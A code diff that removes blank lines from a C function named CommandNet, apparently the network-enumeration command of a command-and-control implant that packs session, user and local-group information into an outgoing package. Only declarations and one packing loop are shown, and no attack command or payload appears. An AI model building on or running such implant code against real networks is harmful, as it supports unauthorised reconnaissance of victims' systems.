@@ -2032,7 +2032,6 @@ VOID CommandNet( PPARSER Parser )
             DWORD               dwTotalEntries  = 0;
             DWORD               dwResumeHandle  = 0;
             DWORD               NetStatus       = NULL;
-
             DWORD               UserNameSize    = 0;
             LPWSTR              ServerName      = NULL;
 
@@ -2094,9 +2093,7 @@ VOID CommandNet( PPARSER Parser )
             DWORD             ResumeHandle      = 0;
             LPWSTR            ServerName        = NULL;
             DWORD             NetStatus         = 0;
-      
             DWORD             ClientNameSize    = 0;
-      
             DWORD             UserNameSize      = 0;
 
             ServerName = ParserGetBytes( Parser, &UserNameSize );
@@ -2211,13 +2208,8 @@ VOID CommandNet( PPARSER Parser )
             DWORD               EntriesRead   = 0;
             DWORD               TotalEntries  = 0;
             DWORD               NetStatus     = 0;
-
-      
             DWORD               GroupSize     = 0;
-
-   
             WCHAR               DescSize      = { 0 };
-
             LPWSTR              ServerName    = NULL;
             DWORD               ServerSize    = 0;
 
@@ -2255,9 +2247,7 @@ VOID CommandNet( PPARSER Parser )
             DWORD               TotalEntries  = 0;
             DWORD               NetStatus     = 0;
             DWORD               Resume        = 0;
-  
             DWORD               GroupSize     = 0;
-        
             WCHAR               DescSize      = { 0 };
             LPWSTR              ServerName    = NULL;
             DWORD               ServerSize    = 0;
@@ -2272,8 +2262,6 @@ VOID CommandNet( PPARSER Parser )
                 {
                     for( DWORD i = 0;i < EntriesRead; i++ )
                     {
-          
-
                         PackageAddBytes( Package, GroupInfo[ i ].lgrpi1_name, StringLengthW( GroupInfo[ i ].lgrpi1_name ) *2 );
                         PackageAddBytes( Package,  GroupInfo[ i ].lgrpi1_comment, StringLengthW( GroupInfo[ i ].lgrpi1_comment ) *2 );
                     }
